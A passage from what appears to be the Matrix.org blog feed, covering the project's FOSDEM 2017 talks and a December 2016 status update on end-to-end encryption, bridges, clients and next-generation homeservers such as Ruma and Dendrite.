&lt;p&gt;We were very lucky to have two talks accepted this year: the main one in the Security Track on the Jansen main stage telling the tale of &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2017&#x2F;schedule&#x2F;event&#x2F;encrypting_matrix&#x2F;&quot;&gt;how we added end-to-end encryption to Matrix&lt;&#x2F;a&gt;  via &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;olm.html&quot;&gt;Olm&lt;&#x2F;a&gt; &amp;amp; &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;Megolm&lt;&#x2F;a&gt; - and the other in the Decentralised Internet room (AW1.125), focusing on the unsolved &lt;a href=&quot;http:&#x2F;&#x2F;fosdem.org&#x2F;2017&#x2F;schedule&#x2F;event&#x2F;matrix_future&quot;&gt;future problems of decentralised accounts, identity, reputation in Matrix&lt;&#x2F;a&gt;.  Both talks were well attended, with huge queues for the Decentralised Internet room: we can only apologise to everyone who queued for 20+ minutes only to still not be able to get in.  Hopefully next year FOSDEM will allocate a larger room for decentralisation!  On the plus side, this year FOSDEM did an amazing job of videoing the sessions - livestreaming every talk, and automatically publishing the recordings (via a fantastic &#x27;publish your own talk&#x27; web interface) - so many of the people who couldn&#x27;t get into the room (as well as the rest of the world) were able to watch it live anyway by the stream.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;This is how popular decentralised communication with &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&quot;&gt;@matrixdotorg&lt;&#x2F;a&gt; is at &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;hashtag&#x2F;fosdem2017?src=hash&quot;&gt;#fosdem2017&lt;&#x2F;a&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;6T5PK6RRJE&quot;&gt;pic.twitter.com&#x2F;6T5PK6RRJE&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&amp;mdash; Jan Weisensee (@ilumium) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ilumium&#x2F;status&#x2F;828172686362890240&quot;&gt;February 5, 2017&lt;&#x2F;a&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Security track at &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;hashtag&#x2F;FOSDEM?src=hash&quot;&gt;#FOSDEM&lt;&#x2F;a&gt;: &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&quot;&gt;@matrixdotorg&lt;&#x2F;a&gt; project &amp; &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ara4n&quot;&gt;@ara4n&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;QwroHSNh8Z&quot;&gt;pic.twitter.com&#x2F;QwroHSNh8Z&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&amp;mdash; miconda (@miconda) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;miconda&#x2F;status&#x2F;828243153706745856&quot;&gt;February 5, 2017&lt;&#x2F;a&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;x0x7xuzlH2&quot;&gt;https:&#x2F;&#x2F;t.co&#x2F;x0x7xuzlH2&lt;&#x2F;a&gt; presentation at the Decentralized Internet Devroom &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;fosdem&quot;&gt;@fosdem&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;J2Wxo9SZ8H&quot;&gt;pic.twitter.com&#x2F;J2Wxo9SZ8H&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&amp;mdash; Tristan Nitot (@nitot) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;nitot&#x2F;status&#x2F;828177298427887617&quot;&gt;February 5, 2017&lt;&#x2F;a&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;You can watch the video of the talks from the FOSDEM website &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2017&#x2F;schedule&#x2F;event&#x2F;encrypting_matrix&#x2F;&quot;&gt;here&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2017&#x2F;schedule&#x2F;event&#x2F;matrix_future&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;.  Both talks necessarily include the similar exposition for folks unfamiliar with Matrix, so apologies for the duplication - also, the &amp;quot;future of decentralised communication&amp;quot; talk ended up a bit rushed; 20 minutes is not a lot of time to both explain Matrix and give an overview of the challenges we face in fixing spam, identity, moderation etc.  But if you like hearing overenthusiastic people talking too fast about how amazing Matrix is, you may wish to check out the videos :)  You can also get at the slides as PDF &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;02&#x2F;2017-02-03.1-FOSDEM-Encrypting-Matrix.pdf&quot;&gt;here (E2E Encryption)&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;02&#x2F;2017-02-04-FOSDEM-Future.pdf&quot;&gt;here (Future of Decentralisation)&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks to evevryone who came to the talks or came and spoke to us at the stand or around the campus.  We had an amazing time, and are already looking forward to next year!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew &amp;amp; the team&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Holiday Special! (2016 edition)</title>
        <published>2016-12-26T00:00:00+00:00</published>
        <updated>2016-12-26T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/12/26/the-matrix-holiday-special-2016-edition/" type="text/html"/>
        <id>https://matrix.org/blog/2016/12/26/the-matrix-holiday-special-2016-edition/</id>
        
        <content type="html">&lt;p&gt;We seem to have fallen into the pattern of giving seasonal &#x27;state of the union&#x27; updates on the Matrix blog, despite best intentions to blog more frequently... although given the &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;11&#x2F;12&#x2F;the-matrix-autumn-special&#x2F;&quot;&gt;Autumn Update&lt;&#x2F;a&gt; ended up being posted in November this one is going to be a relatively incremental update.  Let&#x27;s jump straight in:&lt;&#x2F;p&gt;
&lt;h3 id=&quot;e2e-encryption&quot;&gt;E2E Encryption&lt;&#x2F;h3&gt;
&lt;p&gt;Unless you&#x27;ve been in a coma for the last month you&#x27;ll have hopefully noticed that we &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&#x2F;&quot;&gt;launched the formal beta for E2E Encryption&lt;&#x2F;a&gt; across matrix-{&#x27;{&#x27;}js,ios,android{&#x27;}&#x27;}-sdk (and thus Riot&#x2F;{&#x27;{&#x27;}Web, iOS, Android{&#x27;}&#x27;}) in November, complete with the successful &lt;a href=&quot;http:&#x2F;&#x2F;nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&quot;&gt;independent public security assessment&lt;&#x2F;a&gt; of our Olm and Megolm cryptography library from NCC Group.  So far the beta has gone well in parts: the core Olm&#x2F;Megolm crypto library has held up well with no bugfixes at all required since the audit (yay!).  However, we&#x27;ve hit a lot of different edge cases in the wild where devices can fail to share their outbound session ratchet state to other devices present in the room.  This results in the infamous &amp;quot;Unknown Inbound Session ID&amp;quot; (UISI) errors which many folks will have seen (now renamed to the more meaningful &amp;quot;Unable to decrypt: The sender&#x27;s device has not sent us the keys for this message&amp;quot; error).&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately there&#x27;s a bunch of entirely different causes for this, both platform-specific and cross-platform, and we&#x27;ve been running around untangling all the error reports and getting to the bottom of it.  The good news is that we think we now know the vast majority of the causes, and fixes are starting to land.  We&#x27;ve also just finished a fairly time-consuming formal crypto code-review on the three application SDK implementations (JS, iOS &amp;amp; Android) to shake out any other issues.  Meanwhile some new features have also landed - e.g. the ability for guests to use E2E!  The remaining stuff at this point before we can consider declaring E2E out of beta is:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Finish fixing the UISI errors (in progress)&lt;&#x2F;li&gt;
 	&lt;li&gt;Warn when unverified devices are added to a room&lt;&#x2F;li&gt;
 	&lt;li&gt;Implement passphrased backup &amp; restore for E2E state, so that folks can avoid losing their E2E history when they logout or switch to a new device&lt;&#x2F;li&gt;
 	&lt;li&gt;Improve device verification.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Thanks to everyone who&#x27;s been using E2E and reporting issues - given the number of different UISI error causes out there, it&#x27;s been really useful to go through the different bug reports that folks have submitted.  Please continue to submit them when you see unexpected problems (especially over the coming months as stability improves!)
&lt;h3 id=&quot;new-projects&quot;&gt;New Projects!&lt;&#x2F;h3&gt;
&lt;p&gt;There have been a tonne of new projects popping up from all over the place since the last update.  Looking at the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;commits&#x2F;master&#x2F;supporting-docs&quot;&gt;git history&lt;&#x2F;a&gt; of the &lt;a href=&quot;&#x2F;docs&#x2F;projects&quot;&gt;projects page&lt;&#x2F;a&gt;, we&#x27;ve been adding one every few days!  Highlights include:&lt;&#x2F;p&gt;
&lt;h4 id=&quot;bridges&quot;&gt;Bridges:&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kfatehi&#x2F;matrix-appservice-imessage&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;kfatehi&#x2F;matrix-appservice-imessage&lt;&#x2F;a&gt; - A solid foundation for an iMessage bridge from kfatehi, built on top of the official matrix-appservice-bridge stack.  iMessage and FaceTime&#x27;s crypto is tied into Apple&#x27;s Fairplay DRM (famous for securing the iTunes Music Store and App Store) and is locked all the way down to the &lt;a href=&quot;https:&#x2F;&#x2F;www.apple.com&#x2F;business&#x2F;docs&#x2F;iOS_Security_Guide.pdf&quot;&gt;keypair baked into your Apple device&#x27;s CPU&lt;&#x2F;a&gt; at fabrication time, so for now the bridge has to be run on a macOS device in order to bridge.  It&#x27;s very promising indeed, and exciting to see bridges to relatively inhospitable environments like iMessage popping up!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-fb-chat&#x2F;&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-fb-chat&#x2F;&lt;&#x2F;a&gt; - A proof-of-concept bridge for Facebook Messenger written by Half-Shot in TypeScript on top of the matrix-js-sdk.  Currently you have to manually configure which conversations to bridge between FB and Matrix, but it works!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;exul&#x2F;matrix-rocketchat&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;exul&#x2F;matrix-rocketchat&lt;&#x2F;a&gt;  - A new Rocket.Chat bridge from exul, written in Rust.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;pztrn&#x2F;matrix-xmpp-bridge&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;pztrn&#x2F;matrix-xmpp-bridge&lt;&#x2F;a&gt; - A major fork from pztrn of jfred&#x27;s matrix-xmpp-bridge, now using flask, regius, alembic, sleekxmpp and all sorts.  Currently in very active dev!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CyrusTheHedgehog&#x2F;Hangouts-Bridge&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;CyrusTheHedgehog&#x2F;Hangouts-Bridge&lt;&#x2F;a&gt; - A basic PoC of a Hangouts bridge, written in python3 asyncio&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;clients&quot;&gt;Clients&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;lukebarnard1&#x2F;j&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;lukebarnard1&#x2F;j&lt;&#x2F;a&gt; - A blogging and journalism platform built on Matrix from Luke (moonlighting from the core team!)&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;live.hello-matrix.net&#x2F;&quot;&gt;https:&#x2F;&#x2F;live.hello-matrix.net&#x2F;&lt;&#x2F;a&gt; - a live-blogging system powered by Matrix from @ar&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;pik&#x2F;interlocutor&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;pik&#x2F;interlocutor&lt;&#x2F;a&gt; - An experimental decentralized comment system powered by Matrix, written as a Polymer Webcomponent&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tjgillies&#x2F;freebird&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;tjgillies&#x2F;freebird&lt;&#x2F;a&gt; - a basic twitter clone built on Matrix by tjgillies&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;other-projects&quot;&gt;Other projects&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;slp&#x2F;matrix-pushgw&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;slp&#x2F;matrix-pushgw&lt;&#x2F;a&gt; - A Matrix push gateway written in Golang which exposes a custom TCP push protocol to apps, letting them get push notifications directly from your own gateway rather than via GCM or APNS.  The intention is to use it for Sailfish and Fdroid.  The initial implementation looks very promising - just needs the clientside support, and then folks who don&#x27;t trust Google with their notifications can run completely indie at last!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kultsinuppeli&#x2F;riotchat&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;kultsinuppeli&#x2F;riotchat&lt;&#x2F;a&gt; - Ansible playbook for Riot&#x2F;Web and Synapse&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bismark&#x2F;matrex&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;bismark&#x2F;matrex&lt;&#x2F;a&gt; - Experimental beginnings of a Matrix homeserver written in Elixir!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mlopezr&#x2F;node-red-contrib-matrixbot&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;mlopezr&#x2F;node-red-contrib-matrixbot&lt;&#x2F;a&gt; - Matrix bot plugin for the &lt;a href=&quot;https:&#x2F;&#x2F;nodered.org&#x2F;&quot;&gt;Node-RED&lt;&#x2F;a&gt; IOT platform&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;bots-and-bridges&quot;&gt;Bots and Bridges&lt;&#x2F;h3&gt;
&lt;p&gt;There&#x27;s been a bunch of work from the core team on bots &amp;amp; bridges infrastructure over the last month:&lt;&#x2F;p&gt;
&lt;p&gt;Rearchitecting the slack and gitter bridges to optionally support &#x27;puppeting users&#x27;.  This is in some ways the ultimate flavour of bridging - where you authenticate with the remote service using your &amp;quot;real&amp;quot; gitter&#x2F;slack&#x2F;... credentials, and then the bridge has access to synchronise your full spectrum of data with Matrix.  This is in contrast to the current implementations where the bridge creates virtual users (e.g. Slack webhook bots or IRC virtual user bots) or uses a predefined bot (e.g. matrixbridge on gitter) to link the rooms.&lt;&#x2F;p&gt;
&lt;p&gt;This has some huge advantages: e.g. ability to bridge Slack and Gitter DMs through properly to Matrix; bridging presence and typing notifications correctly, not requiring any custom bots or integrations to be configured; not proxying via a crappy bridge bot as per gitter today; letting Matrixed users be completely indistinguishable from their native selves on the remote platform - so supporting tab complete in Slack, profiles, presence, etc.  The main disadvantage is that you have to have an account on the platform already (although you could argue this is a feature, especially from the remote network&#x27;s perspective!) and that you are delegating access to that account through to the bridge, so you&#x27;d better trust it.  However, you can always run your own bridge if trust is an issue.&lt;&#x2F;p&gt;
&lt;p&gt;The work on this is mid-progress currently, but we&#x27;re really looking forward to seeing the official Slack, Gitter and other bridges support this mode of operation in the new year!&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also been spending some time working with bridges written by the wider community (e.g. Half-Shot&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-appservice-twitter&quot;&gt;twitter bridge&lt;&#x2F;a&gt;) to get them deployed on the matrix.org homeserver itself, to help folks who can&#x27;t run their own.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile there&#x27;s been a lot of work going into supporting the IRC bridge. Main highlights there are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;The release of &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;12&#x2F;19&#x2F;matrix-appservice-irc-0-7-0-is-out&#x2F;&quot;&gt;matrix-appservice-irc 0.7&lt;&#x2F;a&gt;, with all sorts of major new features&lt;&#x2F;li&gt;
 	&lt;li&gt;Turning on bi-directional membership list syncing at last for all networks other than Freenode!  In theory, at least, you should finally see the same list of room members in both IRC and Matrix!!&lt;&#x2F;li&gt;
 	&lt;li&gt;Handling IRC PM botspam from Freenode and OFTC, which bridge through as invite spam into Matrix.  Sorry if you&#x27;ve been bitten by this.  We&#x27;ve worked around it for now by setting appropriate umodes on the IRC bots, and by implementing a &#x27;bulk reject&#x27; button on Riot (under in Settings).  This caused a few nasty outages on Freenode and OFTC. On the plus side, at least it shows that Riot scales up to receiving 2000+ invites without exhibiting ill effects...&lt;&#x2F;li&gt;
 	&lt;li&gt;Considering how to improve history visibility on IRC to avoid scenarios where channel history is shared between users in the same room (even if their IRC bot has temporarily disconnected).  This was a major problem during the Freenode&#x2F;OFTC outages mentioned earlier.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Last but not least, we&#x27;ve just released &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;gomatrix&quot;&gt;gomatrix - a new official Matrix client SDK for golang&lt;&#x2F;a&gt;!  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;go-neb&quot;&gt;Go-neb&lt;&#x2F;a&gt; (the reference golang Matrix bot framework) has been entirely refactored to use gomatrix, which should keep it honest as a 1st class Matrix client SDK for those in the Golang community.  We highly recommend all Golang nuts to go &lt;a href=&quot;https:&#x2F;&#x2F;godoc.org&#x2F;github.com&#x2F;matrix-org&#x2F;gomatrix&quot;&gt;read the documentation&lt;&#x2F;a&gt; and give it a spin!
&lt;h3 id=&quot;riot-desktop&quot;&gt;Riot Desktop&lt;&#x2F;h3&gt;
&lt;p&gt;Riot development has been largely preoccupied with E2E debugging in the respective Matrix Client SDKs, but &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;introducing-riot-0-9-and-desktop-riot-3585d1027243&quot;&gt;0.9.3 was released last week adding in Electron-based desktop app support&lt;&#x2F;a&gt;.  (Remember, if you hate Electron-style desktop apps which provide a desktop app by embedded a webbrowser, you can always use another Matrix client!).  If you&#x27;ve been missing having Riot as a proper desktop app, go get involved!&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-large wp-image-1874&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;12&#x2F;Screen-Shot-2016-12-26-at-01.00.12-1024x687.png&quot; alt=&quot;screen-shot-2016-12-26-at-01-00-12&quot; width=&quot;1024&quot; height=&quot;687&quot; &#x2F;&gt;
&lt;h3 id=&quot;next-generation-homeservers&quot;&gt;Next Generation Homeservers&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;ruma&quot;&gt;Ruma&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ruma.io&quot;&gt;Ruma&lt;&#x2F;a&gt; is a project led by Jimmy Cuadra to build a Matrix homeserver in Rust - the project has been ploughing steadily onwards through 2016 with a bit of an acceleration during December.  You can follow progress at the excellent &lt;a href=&quot;https:&#x2F;&#x2F;www.ruma.io&#x2F;news&#x2F;&quot;&gt;This Week in Ruma&lt;&#x2F;a&gt; blog, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;pulse&#x2F;monthly&quot;&gt;watching the project on Github&lt;&#x2F;a&gt;, and tracking the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;blob&#x2F;master&#x2F;STATUS.md&quot;&gt;API status dashboard&lt;&#x2F;a&gt;.  Some of the latest PRs are looking very promising in terms of getting the core remaining CS APIs working, e.g:&lt;&#x2F;p&gt;
&lt;ul class=&quot;simple-conversation-list varied-states&quot;&gt;
 	&lt;li&gt;&lt;span class=&quot;num&quot;&gt;Merged #113&lt;&#x2F;span&gt;
 &lt;a class=&quot;title&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;pull&#x2F;113&quot;&gt;Add implementation for the filter endpoint.&lt;&#x2F;a&gt; 4 days ago&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span class=&quot;state state-merged&quot;&gt;Merged&lt;&#x2F;span&gt;
&lt;span class=&quot;num&quot;&gt;#125&lt;&#x2F;span&gt;
 &lt;a class=&quot;title&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;pull&#x2F;125&quot;&gt;Adding a Server header to API responses&lt;&#x2F;a&gt; 5 days ago&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span class=&quot;state state-merged&quot;&gt;Merged&lt;&#x2F;span&gt;
&lt;span class=&quot;num&quot;&gt;#105&lt;&#x2F;span&gt;
 &lt;a class=&quot;title&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;pull&#x2F;105&quot;&gt;Add basic implementation for the tags endpoint.&lt;&#x2F;a&gt; 5 days ago&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span class=&quot;num&quot;&gt;Open #106&lt;&#x2F;span&gt;
 &lt;a class=&quot;title&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;pull&#x2F;106&quot;&gt;Add basic implementation for the sync endpoint.&lt;&#x2F;a&gt; 2 days ago&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;span class=&quot;state state-open&quot;&gt;Open&lt;&#x2F;span&gt;
&lt;span class=&quot;num&quot;&gt;#58&lt;&#x2F;span&gt;
 &lt;a class=&quot;title&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;issues&#x2F;58&quot;&gt;API: GET &#x2F;events&lt;&#x2F;a&gt; 20 days ago&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Needless to say, we&#x27;ve been keeping an eye on Ruma with extreme interest, not least as some of the Matrix core team are rabid Rustaceans too :)  We can&#x27;t wait to see it exposing a usable CS API in the hopefully not-too-distant future!!
&lt;h4 id=&quot;dendrite&quot;&gt;Dendrite&lt;&#x2F;h4&gt;
&lt;p&gt;Meanwhile, in the core team, we&#x27;ve been doing some fairly serious experimentation on next-generation homeservers.  Synapse is in a relatively stable state currently, and we&#x27;ve implemented most of the horizontal scalability tricks available to us there (e.g. splitting out &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;workers.rst&quot;&gt;worker processes&lt;&#x2F;a&gt;).  Instead we&#x27;re starting to hit some fundamental limitations of the architecture: the fact that the whole codebase effectively assumes that it&#x27;s talking to a single consistent database instance; python&#x27;s single-threadedness and memory inefficiency; twisted&#x27;s lack of profiling; being limited to sqlite&#x27;s featureset; the fact that the schema has grown organically and is difficulty to refactor aggressively; the fact the app papers over SQL problems by caching everything in RAM (resulting in synapse&#x27;s high RAM requirements); the constant bugs caused by lack of type safety; etc.&lt;&#x2F;p&gt;
&lt;p&gt;We started an experiment in Golang to fix some of this a year ago in the form of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendron&quot;&gt;Dendron&lt;&#x2F;a&gt; - a &amp;quot;&lt;a href=&quot;http:&#x2F;&#x2F;www.martinfowler.com&#x2F;bliki&#x2F;StranglerApplication.html&quot;&gt;strangler pattern&lt;&#x2F;a&gt;&amp;quot; homeserver skeleton intended to sit in front of a synapse and slowly port endpoints over to Go.  In practice, Dendron ended up just being a rather dubious Matrix-aware loadbalancer, and meanwhile no endpoints got moved into it (other than &#x2F;login, which then got moved out again due to the extreme confusion of having to maintain implementations in both Dendron &amp;amp; Synapse).  The main reasons for Dendron&#x27;s failure are a) we had enough on our hands supporting Synapse; b) there were easier scalability improvements (e.g. workers) to be had on Synapse; c) the gradual migration approach looked like it would end up sharing the same storage backend as Synapse anyway, and potentially end up inheriting a bunch of Synapse&#x27;s woes.&lt;&#x2F;p&gt;
&lt;p&gt;So instead, a month or so ago we started a new project codenamed Dendrite (aka Dendron done right ;D) - this time an entirely fresh standalone Golang codebase for rapid development and iteration on the platonic ideal of a next-generation homeserver (and an excuse to audit and better document &amp;amp; spec some of the &lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;14KVTNIZIig1iyRBzK91L6B7tnsfmon7CIWh-DCFRd6k&#x2F;edit&quot;&gt;murkier&lt;&#x2F;a&gt; bits of Matrix).  The project is still very early and there&#x27;s no doc or code to be seen yet, but it&#x27;s looking cautiously optimistic (especially relative to Dendron!).  The project goals are broadly:&lt;&#x2F;p&gt;
&lt;ol&gt;
 	&lt;li&gt;To build a new HS capable of supporting the exponentially increasing load on matrix.org ASAP (which is currently at 600K accounts, 50K rooms, 5 messages&#x2F;s and growing fast).&lt;&#x2F;li&gt;
 	&lt;li&gt;To architecturally support full horizontal scalability through clustering and sharding from the outset - i.e. no single DBs or DB writer processes.&lt;&#x2F;li&gt;
 	&lt;li&gt;To optimise for Postgres rather than be constrained by SQLite, whilst still aiming for a simple but optimal schema and storage layer.  Optimising for smaller resource footprints (e.g. environments where a Postgres is overkill) will happen later - but the good news is that the architecture will support it (unlike Synapse, which doesn&#x27;t scale down nicely even with SQLite).&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
It&#x27;s too early to share more at this stage, but thought we should give some visibility on where things are headed!  Needless to say, Synapse is here for the foreseeable - we think of it as being the Matrix equivalent of the role Apache httpd played for the Web.  It&#x27;s not enormously efficient, but it&#x27;s popular and relatively mature, and isn&#x27;t going away.  Meanwhile, new generations of servers like Ruma and Dendrite will come along for those seeking a sleeker but more experimental beast, much as nginx and lighttpd etc have come along as alternatives to Apache.  Time will tell how the server ecosystem will evolve in the longer term, but it&#x27;s obviously critical to the success of Matrix to have multiple active independent server implementations, and we look forward to seeing how Synapse, Ruma &amp; Dendrite progress!
&lt;h3 id=&quot;2017&quot;&gt;2017&lt;&#x2F;h3&gt;
&lt;p&gt;Looking back at where we were at &lt;a href=&quot;&#x2F;blog&#x2F;2015&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special&#x2F;&quot;&gt;this time last year&lt;&#x2F;a&gt;, 2016 has been a critical year for Matrix as the ecosystem has matured - rolling out E2E encryption; building out proper bot &amp;amp; bridge infrastructure; stabilising and tuning Synapse to keep up with the exponential traffic growth; seeing the explosion of contributors and new projects; seeing Riot edging closer to becoming a viable mainstream communication app.&lt;&#x2F;p&gt;
&lt;p&gt;2017 is going to be all about scaling Matrix - both the network, the ecosystem, and the project.  Whilst we&#x27;ve hopefully transitioned from being a niche decentralisation initiative to a relatively mainstream FOSS project, our ambition is unashamedly to become a mainstream communication (meta)network usable for the widest possible audience (whilst obviously still supporting our current community of FOSS &amp;amp; privacy advocates!).  With this in mind, stuff on the menu for 2017 includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Getting E2E Encryption out of beta asap.&lt;&#x2F;li&gt;
 	&lt;li&gt;Ensuring we can scale beyond Synapse - see Dendrite, above.&lt;&#x2F;li&gt;
 	&lt;li&gt;Getting as many bots and bridges into Matrix as possible, and doing everything we can to support them, host them and help them be as high quality as possible - making the public federated Matrix network as useful and diverse as possible.&lt;&#x2F;li&gt;
 	&lt;li&gt;Supporting Riot&#x27;s leap to the mainstream, ensuring Matrix has at least one killer app.&lt;&#x2F;li&gt;
 	&lt;li&gt;Adding the final major missing features:
&lt;ul&gt;
 	&lt;li&gt;Customisable User Profiles (this is almost done, actually)&lt;&#x2F;li&gt;
 	&lt;li&gt;Groups (i.e. ability to define groups of users, and perform invites, powerlevels etc per-group as well as per-user)&lt;&#x2F;li&gt;
 	&lt;li&gt;Threading&lt;&#x2F;li&gt;
 	&lt;li&gt;Editable events (and Reactions)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
